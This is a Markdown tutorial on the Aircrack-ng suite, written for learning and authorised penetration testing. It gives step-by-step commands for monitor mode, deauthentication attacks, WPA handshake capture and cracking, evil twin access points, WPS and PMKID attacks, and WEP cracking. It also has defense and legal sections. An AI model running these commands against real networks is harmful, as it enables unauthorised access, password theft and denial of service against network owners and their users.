# Aircrack-ng — Wi-Fi Auditing Suite

---

## 1. What is Aircrack-ng?

**Aircrack-ng** is a complete suite of tools for **wireless network auditing**. It captures, monitors, attacks, and cracks Wi-Fi networks.

### The toolkit

| Tool | Purpose |
|------|---------|
| **airmon-ng** | Switch your wireless card to monitor mode |
| **airodump-ng** | Capture all wireless packets, identify APs and clients |
| **aireplay-ng** | Inject packets (deauth, fake auth, etc.) |
| **aircrack-ng** | Crack WEP/WPA/WPA2 from captured handshakes |
| **airbase-ng** | Create a fake access point (Evil Twin) |
| **airdecap-ng** | Decrypt captured traffic once you have the key |

### Install

```bash
sudo apt install aircrack-ng
```

### Requirements

- **A wireless card that supports monitor mode + packet injection**
- Most built-in laptop Wi-Fi cards work for monitoring; some need an external USB adapter for injection (e.g., Alfa AWUS036ACS, Alfa AWUS036NHA)
- USB pass-through to your Kali VM if running virtualized

---

## 2. Wireless 101 (Quick Refresher)

### Modes a Wi-Fi card can be in

| Mode | What it does |
|------|-------------|
| **Managed** | Normal — connects to one network as a client |
| **Monitor** | Captures ALL packets in the air, regardless of network |
| **Master/AP** | Acts as an access point |
| **Ad-hoc** | Peer-to-peer with another card |

For auditing, you need **monitor mode**.

### Channels and frequencies

- **2.4 GHz band** — channels 1-14 (only 1, 6, 11 don't overlap in most regions)
- **5 GHz band** — many non-overlapping channels (36, 40, 44, 48, etc.)
- **6 GHz band** — Wi-Fi 6E (newer)

A monitor session captures one channel at a time — `airodump-ng` cycles through channels by default.

### WPA/WPA2 handshake basics

When a client connects to a WPA2 network:
1. AP sends a challenge
2. Client responds with a hash derived from the password
3. Both sides confirm

The whole exchange = **4-way handshake**. If you capture it, you can attempt offline password cracking.

To **force** a handshake to happen, you can **deauthenticate** an existing client — they'll reconnect, and the handshake is captured.

---

## 3. Step 1 — Enable Monitor Mode

### Check your wireless interfaces

```bash
sudo airmon-ng
```

Sample output:
```
PHY    Interface     Driver       Chipset
phy0   wlan0         iwlwifi      Intel Wireless 8265
```

### Kill conflicting processes

NetworkManager and wpa_supplicant interfere with monitor mode:

```bash
sudo airmon-ng check kill
```

This kills processes that might disrupt monitor mode.

### Start monitor mode

```bash
sudo airmon-ng start wlan0
```

After this, your interface is renamed (e.g., `wlan0` → `wlan0mon`). Verify:

```bash
iwconfig
ip link
```

You should see Mode:Monitor.

### Common issues

```bash
# rfkill blocking the card
sudo rfkill list
sudo rfkill unblock all

# Check driver loaded
lsmod | grep -i wifi
sudo modprobe -r <driver> && sudo modprobe <driver>
```

### Stop monitor mode (restore normal)

```bash
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
```

---

## 4. Step 2 — Discover Networks

```bash
sudo airodump-ng wlan0mon
```

This scans all channels and shows:

```
 BSSID              PWR  Beacons    #Data, #/s  CH   MB    ENC  CIPHER AUTH ESSID
 AA:BB:CC:DD:EE:FF  -45      120       15    0   6    270  WPA2 CCMP   PSK  MyHomeWiFi
 11:22:33:44:55:66  -67       80        2    0  11    130  WPA2 CCMP   PSK  CoffeeShop
```

| Column | Meaning |
|--------|---------|
| **BSSID** | AP's MAC address |
| **PWR** | Signal strength (closer to 0 = stronger) |
| **Beacons** | Number of beacon frames seen |
| **#Data** | Data packets captured |
| **CH** | Channel |
| **ENC** | Encryption (WEP / WPA / WPA2 / WPA3 / OPN) |
| **CIPHER** | Encryption cipher |
| **AUTH** | Authentication (PSK = pre-shared key, MGT = enterprise) |
| **ESSID** | Network name (SSID) |

Below the AP list, you'll see **clients** (stations) connected to APs.

### Target a specific network

Once you spot the target, lock onto its channel and save captures:

```bash
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 6 -w capture wlan0mon
```

| Flag | Purpose |
|------|---------|
| `--bssid` | Filter to one AP's MAC |
| `--channel` | Lock to a single channel (saves all packets) |
| `-w file` | Write captures to `file-01.cap` |

Watch the **STATION** column for clients. You need at least one client present for the handshake attack.

---

## 5. Step 3 — Capture the Handshake (WPA/WPA2)

You need the AP and at least one client. Two ways to capture:

### Option A — Wait passively

Just leave airodump-ng running. When a new client connects (or one reconnects), the handshake is captured. Could take hours.

### Option B — Force a reconnect via deauth

While airodump-ng runs in one terminal, in another:

```bash
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon
```

| Flag | Meaning |
|------|---------|
| `--deauth 5` | Send 5 deauth packets |
| `-a` | AP's BSSID |
| `-c` | Client's MAC (target one client specifically) |

Without `-c`, the command **broadcasts** deauth to all clients.

**Why this works:** the deauth packet tells the client "the AP wants you to disconnect." The client believes it (no auth on these frames) and reconnects → handshake happens → airodump-ng captures it.

### Confirm capture

In airodump-ng's top-right corner, look for:

```
CH  6 ][ Elapsed: 2 min ][ 2026-05-27 ][ WPA handshake: AA:BB:CC:DD:EE:FF
```

**"WPA handshake"** = success. You can now stop airodump-ng (Ctrl+C).

---

## 6. Step 4 — Crack the Password

You now have `capture-01.cap`. Use a wordlist to test passwords against the handshake:

### aircrack-ng (CPU-based)

```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap
```

| Flag | Purpose |
|------|---------|
| `-w` | Wordlist |
| `-b` | Target BSSID |

aircrack-ng tries each password against the handshake. If found:

```
KEY FOUND! [ password123 ]
```

If not, it goes through the whole list and fails. Try another wordlist or use mutations.

### hashcat (GPU-based — much faster)

Convert the capture first:

```bash
# Modern way (uses hcxtools)
sudo apt install hcxtools
hcxpcapngtool -o handshake.hc22000 capture-01.cap

# Crack with hashcat (GPU)
hashcat -m 22000 -a 0 handshake.hc22000 /usr/share/wordlists/rockyou.txt
```

`-m 22000` is hashcat's mode for WPA/WPA2.

For wordlists with rules:

```bash
hashcat -m 22000 handshake.hc22000 rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

A modern GPU can try millions of WPA2 candidates per second. CPU does thousands.

---

## 7. Other Attacks

### Evil Twin (rogue AP)

Create a fake AP with the same SSID to lure clients:

```bash
sudo airbase-ng -e "FreeWiFi" -c 6 wlan0mon
```

Clients that auto-connect to known SSIDs may land on your fake AP. Combined with `--deauth` to kick them off the real AP first.

⚠️ Highly illegal in most jurisdictions outside authorized testing.

### Targeted deauth (Wi-Fi DoS)

Kicks a client off a network:

```bash
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon
```

`--deauth 0` = continuous deauth (run forever until Ctrl+C). DoS attack against that client.

### WPS PIN attack

If WPS is enabled (and the router is old), it can be brute-forced in hours:

```bash
sudo apt install reaver

# Reaver — try every WPS PIN
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# Pixie Dust attack (much faster for vulnerable routers)
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vv
```

WPS attacks succeed on older routers but most modern firmware patches Pixie Dust.

### PMKID attack (no client needed)

Newer technique — you can sometimes get a hash WITHOUT a client present:

```bash
# Capture PMKID
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable-status=1

# Convert and crack with hashcat
hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng
hashcat -m 22000 pmkid.hc22000 rockyou.txt
```

Works on vulnerable routers (most older WPA2 implementations).

---

## 8. WEP Cracking (Legacy)

WEP is **completely broken** but still found on very old equipment.

```bash
# Capture lots of IVs (need 10,000+ for WEP cracking)
sudo airodump-ng --bssid AP_MAC --channel CH -w wep_cap wlan0mon

# Inject ARP packets to speed up IV collection
sudo aireplay-ng --arpreplay -b AP_MAC -h YOUR_MAC wlan0mon

# Crack
aircrack-ng wep_cap-01.cap
```

WEP cracks in minutes once you have enough data. If you find WEP in the wild, the owner is decades behind on security.

---

## 9. Defenses (Blue Team)

If you want your Wi-Fi to survive an aircrack-ng audit:

| Defense | Why |
|---------|-----|
| **Use WPA3** | SAE handshake resists offline cracking |
| **Strong passphrase** (15+ random chars) | Even WPA2 is uncrackable if password isn't dictionary-able |
| **Disable WPS** | Eliminates WPS PIN brute force |
| **Use 802.1X (enterprise)** | Per-user credentials, no shared PSK |
| **Hide unused SSIDs** | Reduces target surface (NOT real security) |
| **Monitor for deauth floods** | IDS/wireless IPS catches attacks |
| **Use MAC filtering as defense-in-depth** (NOT real security) | Adds friction, but MACs are easy to spoof |
| **Update firmware** | Patches like KRACK, Pixie Dust |

A 20-character random WPA2 passphrase is **uncrackable for all practical purposes** — even with massive GPU clusters, rockyou.txt + rules won't find it.

---

## 10. Common Errors & Fixes

| Error | Fix |
|-------|-----|
| `wlan0 doesn't support monitor mode` | Your card lacks driver support. Use USB Alfa adapter. |
| `Operation not permitted` | Run with `sudo` |
| `rfkill blocking` | `sudo rfkill unblock all` |
| No handshake captured | Make sure a client is connected; try deauth |
| `aireplay-ng injection test fails` | Card doesn't support injection — get a different adapter |
| `airodump-ng shows nothing` | Try `sudo airmon-ng check kill` first |
| Monitor mode disappears after suspend | Recreate: `airmon-ng stop wlan0mon && airmon-ng start wlan0` |

### Driver troubleshooting

```bash
# What driver am I using?
sudo airmon-ng

# Check kernel messages for driver errors
dmesg | grep -i wlan
dmesg | tail -50
```

---

## 11. Practical Recipes

### Recipe 1 — Full WPA2 attack workflow

```bash
# 1. Enable monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# 2. Scan to find target
sudo airodump-ng wlan0mon
# (Ctrl+C when you spot the target)

# 3. Lock onto target and capture
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 6 -w capture wlan0mon

# 4. (In another terminal) Deauth a client to force handshake
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon

# 5. Once "WPA handshake" appears in airodump, Ctrl+C

# 6. Crack
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap

# 7. Cleanup
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
```

### Recipe 2 — GPU-accelerated cracking

```bash
# Convert capture
hcxpcapngtool -o hash.hc22000 capture-01.cap

# Crack with GPU (faster)
hashcat -m 22000 -a 0 hash.hc22000 rockyou.txt --force

# With rules
hashcat -m 22000 hash.hc22000 rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### Recipe 3 — PMKID attack (no clients needed)

```bash
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable-status=1
# Wait a few minutes
# Ctrl+C, then:
hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng
hashcat -m 22000 pmkid.hc22000 rockyou.txt
```

### Recipe 4 — Save all visible networks to a file

```bash
sudo airodump-ng -w airscan --output-format csv wlan0mon
# Creates airscan-01.csv with all networks + clients
```

---

## 12. Legal & Ethical Reminders

⚠️ **Wireless attacks are heavily regulated in most countries.**

You may **only** practice:
- On your own Wi-Fi networks
- On networks where you have **written permission** to test
- In a labbed environment (e.g., Hack The Box Wi-Fi labs)

What's illegal in most jurisdictions:
- ❌ Capturing handshakes from neighbors' Wi-Fi
- ❌ Running deauth attacks on coffee shop / hotel networks
- ❌ Setting up evil twin APs in public
- ❌ Cracking WEP/WPA passwords for networks you don't own

Penalties range from fines to multi-year prison sentences depending on the country.

For **legal practice**:
- Set up an old router at home as a target
- Use Wi-Fi-specific labs (HackTheBox, OffSec PWK, TryHackMe wireless rooms)
- Build a lab with isolated equipment

---

## 13. Quick Reference

```bash
# Setup
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Scan all networks
sudo airodump-ng wlan0mon

# Capture target's handshake
sudo airodump-ng --bssid BSSID --channel CH -w capture wlan0mon

# Force handshake via deauth
sudo aireplay-ng --deauth 5 -a BSSID -c CLIENT_MAC wlan0mon

# Crack with CPU
aircrack-ng -w rockyou.txt -b BSSID capture-01.cap

# Crack with GPU (much faster)
hcxpcapngtool -o hash.hc22000 capture-01.cap
hashcat -m 22000 hash.hc22000 rockyou.txt

# Stop monitor mode
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
```

### Three rules

1. **Only attack networks you own or have written permission to test**
2. **Monitor mode kills your normal internet** — have a wired connection ready
3. **Save the .cap file** — you can crack offline later with better wordlists or GPUs
